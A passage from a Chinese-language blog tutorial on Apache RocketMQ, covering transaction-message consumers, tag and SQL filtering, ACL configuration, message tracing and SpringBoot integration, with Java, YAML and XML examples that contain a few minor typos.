<h3 id="事务消息消费者"><a href="#事务消息消费者" class="headerlink" title="事务消息消费者"></a>事务消息消费者</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Consumer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建消费者</span></span><br><span class="line">        <span class="type">DefaultMQPushConsumer</span> <span class="variable">consumer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultMQPushConsumer</span>(<span class="string">&quot;group5&quot;</span>);</span><br><span class="line">        <span class="comment">// 设置nameSrv地址</span></span><br><span class="line">        producer.setNamesrvAddr(<span class="string">&quot;192.168.74.77:9876;192.168.74.88:9876&quot;</span>);</span><br><span class="line">        <span class="comment">// 订阅Topic,Tag;* 表示订阅所有Tag</span></span><br><span class="line">        consumer.subscribe(<span class="string">&quot;transactionTopic&quot;</span>,<span class="string">&quot;*&quot;</span>);</span><br><span class="line">        <span class="comment">// 设置消息监听触发器</span></span><br><span class="line">        consumer.registerMessageListener(<span class="keyword">new</span> <span class="title class_">MessageListenerConcurrently</span>() &#123;</span><br><span class="line">            <span class="comment">// 监听方法</span></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> ConsumeConcurrentlyStatus <span class="title function_">consumeMessage</span><span class="params">(List&lt;MessageExt&gt; msgs, ConsumeConcurrentlyContext context)</span> &#123;</span><br><span class="line">                <span class="comment">// 输出消息</span></span><br><span class="line">                <span class="keyword">for</span> (MessageExt msg : msgs) &#123;</span><br><span class="line">                    System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(msg.getBody()));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> ConsumeConcurrentlyStatus.CONSUME_SUCCESS;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">// 启动消费者</span></span><br><span class="line">        consumer.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h3><ol>
<li>事务消息不支持延时消息和批量消息。</li>
<li>为了避免单个消息被检查太多次而导致半队列消息累积，我们默认将单个消息的检查次数限制为 15 次，但是用户可以通过 Broker 配置文件的 <code>transactionCheckMax</code>参数来修改此限制。如果已经检查某条消息超过该次数的话，Broker 将丢弃此消息，并在默认情况下同时打印错误日志。用户可以通过重写 <code>AbstractTransactionCheckListener</code> 类来修改这个行为。</li>
<li>事务消息将在 Broker 配置文件中的参数 <code>transactionMsgTimeout</code> 这样的特定时间长度之后被检查（默认6秒）。当发送事务消息时，用户还可以通过<strong>Message</strong>的<code>setUserProperty</code>方法，设置消息的属性<code>CHECK_IMMUNITY_TIME_IN_SECONDS</code>来改变这个限制，该参数优先于 <code>transactionMsgTimeout</code> 参数。</li>
<li>事务性消息可能不止一次被检查或消费，因此需要保证幂等性。</li>
<li>提交给用户的目标主题消息可能会失败，目前这依日志的记录而定。它的高可用性通过 RocketMQ 本身的高可用性机制来保证，如果希望确保事务消息不丢失、并且事务完整性得到保证，建议使用同步的双重写入机制。</li>
<li>事务消息的生产者 ID 不能与其他类型消息的生产者 ID 共享。与其他类型的消息不同，事务消息允许反向查询、MQ服务器能通过它们的生产者 ID 查询到消费者。</li>
</ol>
<p>事务消息的应用可以参考<a class="link"   href="https://jimmyz.top/2020/09/25/%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/" >分布式事务解决方案<i class="fas fa-external-link-alt"></i></a>一文。</p>
<h2 id="过滤消息"><a href="#过滤消息" class="headerlink" title="过滤消息"></a>过滤消息</h2><p>RocketMQ提供了消息过滤功能，并且这个消息过滤是在Broker端进行的，而不是在Consumer端进行的，这样可以减少网络IO带来的开销。</p>
<h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><h4 id="标签过滤"><a href="#标签过滤" class="headerlink" title="标签过滤"></a>标签过滤</h4><p>之前的代码中，消费者订阅都是这样写的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">consumer.subscribe(<span class="string">&quot;topic&quot;</span>,<span class="string">&quot;*&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>使用 * 表示订阅该Topic下的所有Tag，这并没有体现出Tag的作用。但其实Tag是一个简单而有用的设计，其可以用来选择我们想要的消息。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">consumer.subscribe(<span class="string">&quot;topic&quot;</span>, <span class="string">&quot;TAGA || TAGB || TAGC&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>消费者将接收包含TAGA或TAGB或TAGC的消息。但是限制是一个消息只能有一个标签，这对于复杂的场景可能不起作用。</p>
<h4 id="属性过滤"><a href="#属性过滤" class="headerlink" title="属性过滤"></a>属性过滤</h4><p>RocketMQ为了解决这样的问题，还支持消息携带<strong>属性</strong>，并且可以使用SQL表达式筛选消息。RocketMQ只定义了一些基本语法来支持这个特性。你也可以很容易地扩展它。</p>
<ul>
<li>数值比较 ：**&gt;，&gt;&#x3D;，&lt;，&lt;&#x3D;，BETWEEN，&#x3D;**</li>
<li>字符比较 ：**&#x3D;，&lt;&gt;，IN**</li>
<li>空值判断 ：<strong>IS NULL</strong> 或者 <strong>IS NOT NULL</strong></li>
<li>逻辑符号 ：<strong>AND，OR，NOT</strong></li>
</ul>
<p>属性常量支持类型为：</p>
<ul>
<li>数值，比如 ：<strong>123，3.1415</strong></li>
<li>字符，比如 ：<strong>‘abc’，必须用单引号包裹起来</strong></li>
<li>特殊的常量 ：<strong>NULL</strong></li>
<li>布尔值 ：<strong>TRUE</strong> 或 <strong>FALSE</strong></li>
</ul>
<p>只有使用push模式的消费者才能用使用SQL92标准的sql语句，接口如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">subscribe</span><span class="params">(finalString topic, <span class="keyword">final</span> MessageSelector messageSelector)</span></span><br></pre></td></tr></table></figure>

<p>下面我们通过一个简单的例子来看看如何使用SQL进行消息过滤。</p>
<h3 id="消息生产者"><a href="#消息生产者" class="headerlink" title="消息生产者"></a>消息生产者</h3><p>发送消息时，通过<code>putUserProperty</code>来设置消息的属性：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SyncProducer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 创建生产者，指定生产组名称</span></span><br><span class="line">        <span class="type">DefaultMQProducer</span> <span class="variable">producer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultMQProducer</span>(<span class="string">&quot;group1&quot;</span>);</span><br><span class="line">        <span class="comment">// 设置nameSrv地址</span></span><br><span class="line">        producer.setNamesrvAddr(<span class="string">&quot;192.168.74.77:9876;192.168.74.88:9876&quot;</span>);</span><br><span class="line">        <span class="comment">// 启动生产者</span></span><br><span class="line">        producer.start();</span><br><span class="line">        <span class="comment">// 发送10条消息</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">            <span class="type">Message</span> <span class="variable">message</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Message</span>(<span class="string">&quot;filterTopic&quot;</span>, <span class="string">&quot;tag1&quot;</span>, (<span class="string">&quot;消息&quot;</span> + i).getBytes());</span><br><span class="line">            <span class="comment">// 设置消息属性</span></span><br><span class="line">            message.putUserProperty(<span class="string">&quot;i&quot;</span>,String.valueOf(i));</span><br><span class="line">            <span class="comment">// 发送消息</span></span><br><span class="line">            <span class="type">SendResult</span> <span class="variable">sendResult</span> <span class="operator">=</span> producer.send(message);</span><br><span class="line">            <span class="comment">// 输出响应结果i</span></span><br><span class="line">            System.out.println(<span class="string">&quot;发送结果:&quot;</span> + sendResult.getSendStatus());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 发送消息结束，关闭Producer实例。</span></span><br><span class="line">        producer.shutdown();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意：消息过滤的使用需要在broker配置文件中添加：<code>enablePropertyFilter=true</code>，否则会报错。</p>
<h3 id="消息消费者"><a href="#消息消费者" class="headerlink" title="消息消费者"></a>消息消费者</h3><p>用<strong>MessageSelector.bySql</strong>来使用sql筛选消息</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Consumer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建消费者</span></span><br><span class="line">        <span class="type">DefaultMQPushConsumer</span> <span class="variable">consumer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultMQPushConsumer</span>(<span class="string">&quot;group1&quot;</span>);</span><br><span class="line">        <span class="comment">// 设置nameSrv地址</span></span><br><span class="line">        producer.setNamesrvAddr(<span class="string">&quot;192.168.74.77:9876;192.168.74.88:9876&quot;</span>);</span><br><span class="line">        <span class="comment">// 订阅Topic,并且设置Sql</span></span><br><span class="line">        consumer.subscribe(<span class="string">&quot;filterTopic&quot;</span>, MessageSelector.bySql(<span class="string">&quot;i &gt; 5&quot;</span>));</span><br><span class="line">        <span class="comment">// 设置消息监听触发器</span></span><br><span class="line">        consumer.registerMessageListener(<span class="keyword">new</span> <span class="title class_">MessageListenerConcurrently</span>() &#123;</span><br><span class="line">            <span class="comment">// 监听方法</span></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> ConsumeConcurrentlyStatus <span class="title function_">consumeMessage</span><span class="params">(List&lt;MessageExt&gt; msgs, ConsumeConcurrentlyContext context)</span> &#123;</span><br><span class="line">                <span class="comment">// 输出消息</span></span><br><span class="line">                <span class="keyword">for</span> (MessageExt msg : msgs) &#123;</span><br><span class="line">                    System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(msg.getBody()));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> ConsumeConcurrentlyStatus.CONSUME_SUCCESS;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">// 启动消费者</span></span><br><span class="line">        consumer.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>“ i &gt; 5 ” 就表示只接受属性 i 大于5的消息。</p>
<h1 id="ACL权限控制"><a href="#ACL权限控制" class="headerlink" title="ACL权限控制"></a>ACL权限控制</h1><p>权限控制（ACL）主要为RocketMQ提供Topic资源级别的用户访问控制。用户在使用RocketMQ权限控制时，主要分为如下两步：</p>
<h2 id="服务端配置"><a href="#服务端配置" class="headerlink" title="服务端配置"></a>服务端配置</h2><ul>
<li>在broker的配置文件中添加如下配置开启ACL</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">aclEnable=<span class="literal">true</span></span><br></pre></td></tr></table></figure>

<ul>
<li>然后再<code>conf/plain_acl.yml</code>文件中配置权限信息</li>
</ul>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 全局白名单，不受ACL控制 </span></span><br><span class="line"><span class="comment"># 通常需要将主从架构中的所有节点加进来</span></span><br><span class="line"><span class="attr">globalWhiteRemoteAddresses:</span></span><br><span class="line"><span class="bullet">-</span> <span class="number">10.10</span><span class="number">.103</span><span class="string">.*</span> </span><br><span class="line"><span class="bullet">-</span> <span class="number">192.168</span><span class="number">.0</span><span class="string">.*</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置账户信心</span></span><br><span class="line"><span class="attr">accounts:</span> </span><br><span class="line"><span class="comment"># 第一个账户 </span></span><br><span class="line">  <span class="comment"># 用户名</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">accessKey:</span> <span class="string">liduoan</span></span><br><span class="line">  <span class="comment"># 密码</span></span><br><span class="line">  <span class="attr">secretKey:</span> <span class="number">123456</span></span><br><span class="line">  <span class="attr">whiteRemoteAddress:</span> </span><br><span class="line">  <span class="comment"># 是否是管理员</span></span><br><span class="line">  <span class="attr">admin:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">defaultTopicPerm:</span> <span class="string">DENY</span> <span class="comment"># 默认Topic访问策略是拒绝</span></span><br><span class="line">  <span class="attr">defaultGroupPerm:</span> <span class="string">SUB</span> <span class="comment"># 默认Group访问策略是只允许订阅 </span></span><br><span class="line">  <span class="attr">topicPerms:</span> </span><br><span class="line">  <span class="bullet">-</span> <span class="string">topicA=DENY</span>  <span class="comment"># topicA拒绝 </span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">topicB=PUB|SUB</span>  <span class="comment"># topicB允许发布和订阅消息</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">topicC=SUB</span>  <span class="comment"># topicC只允许订阅 </span></span><br><span class="line">  <span class="attr">groupPerms:</span> <span class="comment"># the group should convert to retry topic </span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">groupA=DENY</span> </span><br><span class="line">  <span class="bullet">-</span> <span class="string">groupB=PUB|SUB</span> </span><br><span class="line">  <span class="bullet">-</span> <span class="string">groupC=SUB</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二个账户，只要是来自192.168.74.*的IP，就可以访问所有资源 </span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">accessKey:</span> <span class="string">rocketmq2</span></span><br><span class="line">  <span class="attr">secretKey:</span> <span class="number">12345678</span> </span><br><span class="line">  <span class="attr">whiteRemoteAddress:</span> <span class="number">192.168</span><span class="number">.74</span><span class="string">.*</span></span><br><span class="line">  <span class="comment"># 是否是管理员</span></span><br><span class="line">  <span class="attr">admin:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>关于Topic的四种权限说明如下：</p>
<table>
<thead>
<tr>
<th>权限</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>DENY</td>
<td>拒绝</td>
</tr>
<tr>
<td>ANY</td>
<td>PUB 或者 SUB 权限</td>
</tr>
<tr>
<td>PUB</td>
<td>发送权限</td>
</tr>
<tr>
<td>SUB</td>
<td>订阅权限</td>
</tr>
</tbody></table>
<blockquote>
<p>RocketMQ中的ACL支持热加载，修改配置文件后无须重启服务即可立即生效。</p>
</blockquote>
<h1 id="消息轨迹追踪"><a href="#消息轨迹追踪" class="headerlink" title="消息轨迹追踪"></a>消息轨迹追踪</h1><p>RocketMQ还提供了消息轨迹追踪的功能，可以对如下信息进行追踪：</p>
<table>
<thead>
<tr>
<th>Producer端</th>
<th>Consumer端</th>
<th>Broker端</th>
</tr>
</thead>
<tbody><tr>
<td>生产实例信息</td>
<td>消费实例信息</td>
<td>消息的Topic</td>
</tr>
<tr>
<td>发送消息时间</td>
<td>投递时间,投递轮次</td>
<td>消息存储位置</td>
</tr>
<tr>
<td>消息是否发送成功</td>
<td>消息是否消费成功</td>
<td>消息的Key值</td>
</tr>
<tr>
<td>发送耗时</td>
<td>消费耗时</td>
<td>消息的Tag值</td>
</tr>
</tbody></table>
<p>首先需要在broker的配置文件中添加如下配置开启消息追踪：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">traceTopicEnable=<span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>在代码中开启消息追踪：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 生产者消息追踪：将第二个参数设置为true</span></span><br><span class="line"><span class="type">DefaultMQProducer</span> <span class="variable">producer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultMQProducer</span>(<span class="string">&quot;group1&quot;</span>,<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 消费者消息追踪：将第二个参数设置为true</span></span><br><span class="line"><span class="type">DefaultMQPushConsumer</span> <span class="variable">consumer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultMQPushConsumer</span>(<span class="string">&quot;group1&quot;</span>,<span class="literal">true</span>);</span><br></pre></td></tr></table></figure>

<p>如果按照上面的方式，在默认情况下，消息轨迹数据是存储于系统级的<strong>RMQ_SYS_TRACE_TOPIC</strong>这个主题中。如果用户想自定义消息轨迹存储主题，可以通过如下方式：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 第三个参数为自定义消息轨迹数据的存储主题</span></span><br><span class="line"><span class="type">DefaultMQProducer</span> <span class="variable">producer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultMQProducer</span>(<span class="string">&quot;group1&quot;</span>,<span class="literal">true</span>,<span class="string">&quot;topic_trace&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第三个参数为自定义消息轨迹数据的存储主题</span></span><br><span class="line"><span class="type">DefaultMQPushConsumer</span> <span class="variable">consumer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultMQPushConsumer</span>(<span class="string">&quot;group1&quot;</span>,<span class="string">&quot;topic_trace&quot;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="客户端访问"><a href="#客户端访问" class="headerlink" title="客户端访问"></a>客户端访问</h2><ul>
<li>导入ACL依赖</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.rocketmq<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>rocketmq-acl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>通过<code>RPCHook</code>添加ACL</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建RPCHook对象，添加用户名和密码</span></span><br><span class="line"><span class="type">RPCHook</span> <span class="variable">rpchook</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AclClientRPCHook</span>(<span class="keyword">new</span> <span class="title class_">SessionCredentials</span>(<span class="string">&quot;jimmy&quot;</span>,<span class="string">&quot;123456&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建生产者时添加ACL信息</span></span><br><span class="line"><span class="type">DefaultMQProducer</span> <span class="variable">producer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultMQProducer</span>(<span class="string">&quot;group1&quot;</span>, getAclRPCHook());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建消费者时添加ACL信息</span></span><br><span class="line"><span class="type">DefaultMQPushConsumer</span> <span class="variable">consumer</span> <span class="operator">=</span> </span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">DefaultMQPushConsumer</span>(<span class="string">&quot;group1&quot;</span>,</span><br><span class="line">                              getAclRPCHook(), </span><br><span class="line">                              <span class="keyword">new</span> <span class="title class_">AllocateMessageQueueAveragely</span>());</span><br></pre></td></tr></table></figure>





<h1 id="SpringBoot整合RocketMQ"><a href="#SpringBoot整合RocketMQ" class="headerlink" title="SpringBoot整合RocketMQ"></a>SpringBoot整合RocketMQ</h1><h2 id="准备工作-1"><a href="#准备工作-1" class="headerlink" title="准备工作"></a>准备工作</h2><ul>
<li>导入依赖</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.rocketmq<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>rocketmq-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>在使用SpringBoot的starter集成包时，要特别注意版本。因为SpringBoot集成RocketMQ的starter依赖是由Spring社区提供的，目前正在快速迭代的过程当中，不同版本之间的差距非常大，甚至基础的底层对象都会经常有改动。</p>
</blockquote>
<ul>
<li>配置文件</li>
</ul>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="comment"># nameSrv地址</span></span><br><span class="line"><span class="attr">rocketmq.name-server</span>=<span class="string">192.168.74.77:9876;192.168.74.88:9876</span></span><br><span class="line"><span class="comment"># rocketmq生产组名(消费方不需要配置)</span></span><br><span class="line"><span class="attr">rocketmq.producer.group</span>=<span class="string">orderProducerGroup</span></span><br></pre></td></tr></table></figure>

<h2 id="消息生产者-1"><a href="#消息生产者-1" class="headerlink" title="消息生产者"></a>消息生产者</h2><p>Springboot的启动类不再赘述，我们编写一个测试类为大家展示如何发送消息：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RunWith(SpringRunner.class)</span></span><br><span class="line"><span class="meta">@SpringBootTest(classes = &#123;MQSpringBootApplication.class&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProducerTest</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 注入RocketMQTemplate</span></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> RocketMQTemplate rocketMQTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test1</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">// 方法1：先获取生产者，通过原生方式发送</span></span><br><span class="line">        <span class="type">Message</span> <span class="variable">rocketMqMessage</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Message</span>(<span class="string">&quot;topic&quot;</span>, <span class="string">&quot;tagA&quot;</span>, <span class="string">&quot;keyA&quot;</span>, <span class="string">&quot;hello word&quot;</span>.getBytes());</span><br><span class="line">        rocketMQTemplate.getProducer().send(rocketMqMessage);</span><br><span class="line">        </span><br><span class="line">	    <span class="comment">// 方法2：通过Spring的方式发送，传入的是Spring的Message类型</span></span><br><span class="line">        Message&lt;String&gt; msg </span><br><span class="line">            = MessageBuilder</span><br><span class="line">                .withPayload(<span class="string">&quot;hello word&quot;</span>)  <span class="comment">// 设置消息体</span></span><br><span class="line">                .setHeader(RocketMQHeaders.TAGS,<span class="string">&quot;tag&quot;</span>)  <span class="comment">// 设置头部信息</span></span><br><span class="line">                .setHeader(<span class="string">&quot;prop1&quot;</span>,<span class="string">&quot;123&quot;</span>)  <span class="comment">// 设置头部信息</span></span><br><span class="line">                .build();</span><br><span class="line">        <span class="comment">// tag拼接在topic后面，通过:分割</span></span><br><span class="line">        rocketMQTemplate.send(<span class="string">&quot;topic:tag&quot;</span>,msg);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 方法3：通过Spring的方式发送，传入的可以是各种对象</span></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;msg&quot;</span>,<span class="string">&quot;hello world&quot;</span>)</span><br><span class="line">        <span class="comment">// tag拼接在topic后面，通过:分割    </span></span><br><span class="line">        rocketMQTemplate.convertAndSend(<span class="string">&quot;topic:tag&quot;</span>,map);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 方法4：同步发送，可发送各种对象</span></span><br><span class="line">        <span class="type">SendResult</span> <span class="variable">sendResult</span> <span class="operator">=</span> rocketMQTemplate.syncSend(<span class="string">&quot;topic:tag&quot;</span>,msg);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 方法5：异步发送，带回调</span></span><br><span class="line">        rocketMQTemplate.asyncSend(<span class="string">&quot;topic:tag&quot;</span>,msg,<span class="keyword">new</span> <span class="title class_">SendCallback</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onSuccess</span><span class="params">(SendResult var1)</span> &#123;</span><br><span class="line">                System.out.printf(<span class="string">&quot;async onSucess SendResult=%s %n&quot;</span>, var1);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onException</span><span class="params">(Throwable var1)</span> &#123;</span><br><span class="line">                System.out.printf(<span class="string">&quot;async onException Throwable=%s %n&quot;</span>, var1);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 方法6：同步发送消息，最后一个参数指定返回一个String类型的结果，可以是各种类型</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">replyString</span> </span><br><span class="line">            <span class="operator">=</span> rocketMQTemplate.sendAndReceive(<span class="string">&quot;topic:tag&quot;</span>, msg, String.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过RocketMQTemplate发送消息，和我们之前介绍的RabbitMQ非常类似。我们以发送普通的消息为例，代码中演示了几种常见的方式。</p>
<blockquote>
<p>除了第1种方式，其他方式都是通过Spring提供的方式发送消息，而不是方式1原生的RocketMQ客户端的方式，消息的Tag标签需要拼接在Topic后面，通过<code>:</code>分割。另外Spring包中的Message通过<code>setHeader</code>方法设置头信息时，会自动加上一个前缀：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 生产者：构建消息</span></span><br><span class="line">Message&lt;String&gt; msg </span><br><span class="line">      = MessageBuilder</span><br><span class="line">             .withPayload(<span class="string">&quot;hello word&quot;</span>)  <span class="comment">// 设置消息体</span></span><br><span class="line">             .setHeader(RocketMQHeaders.TAGS,<span class="string">&quot;tag&quot;</span>)  <span class="comment">// 设置头部信息</span></span><br><span class="line">             .build();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 消费者：获取消息头部信息的时候需要加上一个前缀</span></span><br><span class="line"><span class="type">String</span> <span class="variable">tags</span></span><br><span class="line"><span class="operator">=</span> msg.getHeaders().get(RocketMQHeaders.PREFIX+RocketMQHeaders.TAGS).toString();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过RocketMQUtil工具类可以将Spring的Message转成RocketMQ的Message对象</span></span><br><span class="line">org.apache.rocketmq.common.message.<span class="type">Message</span> <span class="variable">message</span> </span><br><span class="line"><span class="operator">=</span> RocketMQUtil.convertToRocketMessage(<span class="keyword">new</span> <span class="title class_">StringMessageConverter</span>(),</span><br><span class="line">                                       <span class="string">&quot;UTF-8&quot;</span>, </span><br><span class="line">                                       destination,</span><br><span class="line">                                       msg);</span><br><span class="line"><span class="comment">// 转换后就可以通过原始的方式获取Tag       </span></span><br><span class="line"><span class="type">String</span> <span class="variable">tags</span> <span class="operator">=</span> message.getTags();</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="消息消费者-1"><a href="#消息消费者-1" class="headerlink" title="消息消费者"></a>消息消费者</h2><p>假设接收的消息类型为RocketMQ包下的Message类型,代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@RocketMQMessageListener(topic = &quot;springboot-mq&quot;,  // 主题</span></span><br><span class="line"><span class="meta">                         consumerGroup = &quot;springboot-mq-consumer-1&quot;,  // 消费者组</span></span><br><span class="line"><span class="meta">                         selectorType = SelectorType.TAG, // 消息过滤类型，可选择SQL92类型</span></span><br><span class="line"><span class="meta">                         selectorExpression = &quot;*&quot;,  // 消息过滤表达式</span></span><br><span class="line"><span class="meta">                         consumeMode = ConsumeMode.CONCURRENTLY, //并发消费或者顺序消费</span></span><br><span class="line"><span class="meta">                         MessageModel = MessageModel.CLUSTERING //集群模式或广播模式</span></span><br><span class="line"><span class="meta">                         )</span> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Consumer</span> <span class="keyword">implements</span> <span class="title class_">RocketMQListener</span>&lt;MessageExt&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 监听消息的方法，接收到消息时会触发</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onMessage</span><span class="params">(MessageExt messagesExt)</span> &#123;</span><br><span class="line">        log.info(<span class="string">&quot;接收到消息：&quot;</span> + messagesExt);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>实现消息消费者的步骤大致有以下两点：</p>
<ol>
